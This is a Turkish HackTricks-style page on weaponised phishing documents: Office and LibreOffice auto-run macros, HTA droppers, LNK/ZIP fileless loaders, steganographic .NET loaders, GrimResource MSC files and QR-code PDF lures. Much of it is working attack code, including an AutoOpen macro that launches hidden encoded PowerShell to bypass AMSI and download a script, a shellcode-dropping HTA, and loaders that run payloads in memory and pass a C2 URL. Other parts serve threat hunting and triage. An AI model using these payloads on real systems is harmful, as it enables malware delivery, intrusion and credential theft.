# Kimlik Avı Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması biçiminde gerçekleştirilir. Veri yapısının tanımlanması sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro yürütme özelliğini korumak mümkündür.\
Örneğin, RTF dosyaları tasarımları gereği makroları desteklemez; ancak DOCM dosyasının uzantısı RTF olarak değiştirildiğinde Microsoft Word tarafından işlenir ve makro yürütme özelliğini korur.\
Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite'teki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programlarının hangi uzantıları yürüteceğini kontrol etmek için aşağıdaki komutu kullanabilirsiniz:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvuruyorsa makroları da “çalıştırabilir”.

### Harici Görsel Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Belgeleri - Harici Görsel Yükleme: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Makro Arka Kapısı

Belgeden rastgele kod çalıştırmak için makrolar kullanılabilir.

#### Otomatik yükleme işlevleri

Ne kadar yaygınlarsa, AV tarafından algılanma olasılıkları da o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** bölümüne gidin; Document Inspector açılır. **Inspect**'e, ardından **Document Properties and Personal Information** seçeneğinin yanındaki **Remove All**'a tıklayın.

#### Doc uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`** biçimine değiştirin.\
Bunu yapın; çünkü **`.docx`** dosyalarına **macro** kaydedemezsiniz ve macro etkin **`.docm`** uzantısının etrafında bir **damga** vardır (ör. küçük resim simgesinde kocaman bir `!` bulunur ve bazı web/e-posta gateway'leri bu dosyaları tamamen engeller). Bu nedenle, eski **`.doc`** uzantısı en iyi uzlaşmadır.

#### Kötü amaçlı Macro oluşturucuları

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırma macro'ları (Basic)

LibreOffice Writer belgelerine Basic macro'ları gömülebilir ve macro, **Open Document** olayına bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyle görünür:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Dize içindeki çift tırnaklara (`""`) dikkat edin – LibreOffice Basic, düz tırnakları kaçırmak için bunları kullanır; bu nedenle `...==""")` ile biten payload'larda hem içteki komut hem de Shell argümanı dengeli kalır.

Teslimat ipuçları:

- Dosyayı `.odt` olarak kaydedin ve makroyu belge olayına bağlayarak belge açıldığında hemen çalışmasını sağlayın.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` işareti gereklidir; böylece ek olarak dosya adı dizesi değil, dosyanın baytları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.

## HTA Files

HTA, **HTML ve VBScript ile JScript gibi betik dillerini birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelindeki kısıtlamalara tabi olmadan, "tam güvenilir" bir uygulama olarak çalışır.

HTA, **`mshta.exe`** kullanılarak çalıştırılır. Bu dosya genellikle **Internet Explorer** ile birlikte yüklenir; bu nedenle **`mshta`, IE'ye bağımlıdır**. IE kaldırılmışsa HTA'lar çalıştırılamaz.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML e-postalarda sahte ek kartları

HTML e-posta, gerçek bir ek taşımak yerine sağlayıcının yerel ek önizleme kartını taklit edebilir. Talos, Base64 ile kodlanmış dört satır içi PNG MIME parçasından yeniden oluşturulmuş bir Gmail kartı gözlemledi. Görselin tamamı tek bir anchor içine alınmıştı ve `?m=<target-id>` içindeki alıcı değeri, alıcı bazında izlemeyi mümkün kılıyordu. Bağlantı `http://` veya `https://` yerine `//` ile başlıyordu; tarayıcılar bu protokol-göreli biçimi çözümler, ancak yalnızca tam nitelikli URL’lerle eşleşen URL çıkarıcılar bunu gözden kaçırabilir.<sup>[[11]](#references)</sup>

Analiz sırasında, oluşturulan ek listesine güvenmek yerine ham MIME’ı inceleyin. Satır içi görüntü parçalarının görsel kartı nasıl oluşturduğunu yeniden kurun, kartı saran anchor’ı belirleyin ve URL’leri çıkarmadan önce protokol-göreli `href` değerlerini normalize edin.<sup>[[11]](#references)</sup>

Envelope/header gönderen sahteciliği ve DMARC hizalama testi için bkz. [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## NTLM Authentication'ı Zorlama

NTLM authentication'ı "uzaktan" **zorlamanın** birkaç yolu vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML içeriğine **görünmez görüntüler** ekleyebilirsiniz (HTTP MitM ile de olabilir mi?). Ya da kurbanın **klasörü açmasıyla** bir **authentication** işlemini **tetikleyecek** dosyaların **adresini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication'ı çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP İçine Gömülü Payload'lar (fileless zincir)

Son derece etkili kampanyalar, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren ZIP dosyaları dağıtır. Buradaki püf nokta, asıl PowerShell loader'ın ZIP dosyasının ham baytlarında benzersiz bir işaretçiden sonra saklanması ve .lnk dosyasının bu içeriği çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner'ının uyguladığı tipik akış:

1) Orijinal ZIP dosyasını yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretçi bulun (ör. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP dosyasını %ProgramData% konumuna kopyalayın, orada çıkarın ve meşru görünmesi için yem .docx dosyasını açın.
4) Geçerli işlem için AMSI'ı atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamanın obfuscation'ını kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı çıkarmak ve çalıştırmak için örnek PowerShell iskeleti:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notlar
- Teslimat genellikle güvenilir PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşula bağlayabilir (IP/UA'ya göre zararsız ZIP dosyaları sunar).
- Sonraki aşama, disk üzerindeki izleri en aza indirmek için sıklıkla base64/XOR shellcode'un şifresini çözer ve bunu Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan persistence
- Microsoft Web Browser kontrolünün COM TypeLib hijacking'i; böylece IE/Explorer veya bu kontrolü gömülü olarak kullanan herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılar ve kullanıma hazır komutlar için buraya bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Avcılık/IOCs
- Arşiv verisinin sonuna eklenmiş ASCII işaret dizgesini (örn. xFIQCV) içeren ZIP dosyaları.
- ZIP dosyasını bulmak ve yem belgeyi açmak için üst/ kullanıcı klasörlerini tarayan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI üzerinde oynama.
- Güvenilir PaaS alan adlarında barındırılan bağlantılarla biten, uzun süredir devam eden iş yazışmaları.

## Önce yem açan LNK aşamalandırması → zamanlanmış görev persistence'ı → güvenilir CPL side-loading

Tekrarlayan bir başka örüntü, arka planda gerçek zinciri aşamalandırırken zararsız bir yem dosyasını hemen açan, **belge gibi görünen bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin token'ları (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalar; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespit mekanizmaları komutu gözden kaçırır.
3. Stager önce **yem belgeyi indirir**, kurbanın açması için belgeyi açar ve ardından zararlı dosyaları arka planda yeniden oluşturur.
4. Payload'lar **anlamsız uzantılarla** yazılabilir ve ardından dolgu karakterleri kaldırılarak yeniden adlandırılabilir; böylece belirgin `.exe` / `.cpl` dosyalarının ortaya çıkması geciktirilir.
5. Persistence, kullanıcı tarafından yazılabilir bir yoldaki güvenilir bir host binary'yi başlatan **dakika bazlı bir zamanlanmış görevle** sağlanır.

Bu örüntüden çıkarılabilecek asgari avcılık ipuçları:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Tanımaya değer bir staging düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir

Rapid7 vaka incelemesinde, zamanlanmış görev **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar başlatıyordu. **`APPWIZ.cpl`** dosyası onun yanına yerleştirilip **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary’si sistemdeki yasal kopya yerine saldırganın CPL dosyasını side-load ediyordu.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki **AES-256-CBC** blob’unu okur
- **Windows CNG / `bcrypt.dll`** aracılığıyla şifresini çözer
- Çalıştırılabilir bellek ayırır ve şifresi çözülmüş shellcode’u kopyalar
- Shellcode pointer’ını **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı biçimde çalıştırır

Bu son adım ayrıca araştırılmaya değer: malware, doğrudan `((void(*)())buf)()` atlamasından kaçınmak için çoğu zaman **meşru, callback alan bir WinAPI** işlevini kötüye kullanarak çalıştırmayı devreder.

Bu kampanyadaki şifresi çözülmüş payload **Donut** shellcode’uydu. Ardından son PE dosyasını tamamen belleğe eşledi ve çalıştırmayı devretmeden önce geçerli süreçte **AMSI/WLDP/ETW**’yi yamaladı. Side-loading ve bellekte çalışan post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik araştırma ipuçları:
- `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatmasının ardından görünür bir yem belgesinin açılması.
- **`C:\Users\Public\`** konumuna kısa süreli indirmeler yapılması ve ardından anlamsız uzantılardan hemen yeniden adlandırılması.
- `GoogleErrorReport` gibi sıradan adlara sahip zamanlanmış görevlerin **kullanıcının yazabildiği dizinlerden** çalıştırılması.
- Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
- **`C:\Windows\Tasks\`** altında Base64 metin blob’larının yazılması ve ardından side-load edilmiş modül tarafından okunması.

## Görsellerde steganografiyle ayrılmış payload’lar (PowerShell stager)

Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran gizlenmiş JavaScript/VBS dosyaları sunar. Bu stager, benzersiz başlangıç/bitiş işaretleyicileri arasında düz metin olarak gizlenmiş, Base64 ile kodlanmış bir .NET DLL içeren bir görseli (genellikle GIF) indirir. Betik bu ayraçları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, baytlara Base64 çözümlemesi yapar, assembly’yi belleğe yükler ve bilinen bir giriş yöntemini C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>

İş akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → içindeki Base64’ü çözer → `-nop -w hidden -ep bypass` seçenekleriyle PowerShell stager’ını başlatır.
- Aşama 2: PowerShell stager → görseli indirir, işaretleyicilerle ayrılmış Base64 verisini çıkarır, .NET DLL’yi belleğe yükler ve yöntemini (ör. VAI) C2 URL’si ve seçenekleri geçirerek çağırır.
- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing aracılığıyla güvenilir bir binary’ye (çoğunlukla MSBuild.exe) enjekte eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı program proxy execution hakkında daha fazla bilgi için bkz.:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir görselden DLL çıkarmak ve bellekte bir .NET yöntemini çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload çıkarıcı ve loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganografi/işaretleyici gizleme).<sup>[[6]](#references)</sup> İşaretleyiciler kampanyalar arasında farklılık gösterir.
- AMSI/ETW bypass ve string deobfuscation, assembly yüklenmeden önce yaygın olarak uygulanır.
- Tehdit avı: İndirilen görselleri bilinen ayraçlara göre tarayın; görsellere erişip hemen Base64 blob'larını decode eden PowerShell işlemlerini belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell hazırlama aşaması

Yinelenen bir ilk aşama, arşiv içinde gönderilen küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` ile çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantık (soyut):
- Kendi dosyasının içeriğini oku
- Önemsiz string'ler arasındaki bir Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `wscript.exe`/`cscript.exe` aracılığıyla `powershell.exe` çalıştır

Tehdit avı ipuçları
- Komut satırında `-enc`/`FromBase64String` bulunan `powershell.exe` işlemlerini başlatan arşivlenmiş JS/VBS ekleri.
- Kullanıcı geçici dizinlerinden `powershell.exe -nop -w hidden` çalıştıran `wscript.exe` işlemleri.

## Yürütme kapsayıcıları olarak MSC belgeleri (GrimResource)

Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` ile açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yapılan `StringTable` başvurusunu silah olarak kullanır; böylece kullanıcı hazırlanmış konsolu açtığında JavaScript `mmc.exe` içinde çalışır. Gözlemlenen örneklerde, alışılagelmiş Office makro yolunu kullanmadan bir .NET payload'ı örneklemek için `transformNode` tabanlı obfuscation ile **DotNetToJScript** bir arada kullanılmıştır.<sup>[[9]](#references)</sup>

Statik ilk incelemede, güvenilmeyen bir MSC'yi metin olarak ele alın ve üzerine **çift tıklamayın**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Yüksek sinyalli çalışma zamanı pivotları arasında `mmc.exe`'nin CLR veya script bileşenlerini yüklemesi, ağ bağlantıları oluşturması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir yürütülebilir dosya başlatması yer alır. Bu biçim meşru olduğundan, tespitler her MSC'yi engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** arasında ilişki kurmalıdır.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload koşullandırma

Bir PDF'nin işe yaraması için exploit içermesi gerekmez. Yakın tarihli kampanyalar, zararsız görünen bir belgeye **QR kodu veya sıradan bir bağlantı** yerleştiriyor, tarayıcı oturumunu e-posta denetimlerinden uzaklaştırıyor ve hedefi alıcının adresine göre kişiselleştiriyor. Microsoft, QR URL'lerinin her alıcı için benzersiz olduğu ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendirdiği 2025 tarihli PDF'leri belgeledi; paralel bir zincirde ise IP/ortam koşullandırması kullanılarak seçili ziyaretçilere bir JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>

Hem PDF eylemlerini hem de işlenmiş QR kodlarını triyaj edin. Bir QR kodu çıkarılabilir bir görüntü olarak saklanmak yerine vektör olarak çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Yalıtılmış bir analiz sisteminden kimlik doğrulaması yapmadan çözümlenmiş hedefleri ve yönlendirmeleri inceleyin. Yararlı avcılık özellikleri arasında gövdesi neredeyse boş e-postalarla gelen yalnızca QR kodu içeren PDF'ler, sorgu parametresine gömülü alıcı e-posta adresi, güvenilir barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP, coğrafi konum, çerezler, referrer veya user agent'a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca sahte içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM kimlik bilgilerini çalınabilecek yerler** hakkındaki sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice makrosu → IIS webshell'i → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedefleyen gelişmiş bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader zinciri üzerinden Dropping Elephant'ın tradecraft'ini izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar dağıtıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografi (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Güvenilir geliştirici araçları proxy execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tehdit aktörleri, vergi temalı phishing kampanyaları düzenlemek için vergi döneminden yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 teslimat zinciri ve Antino backdoor'u](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
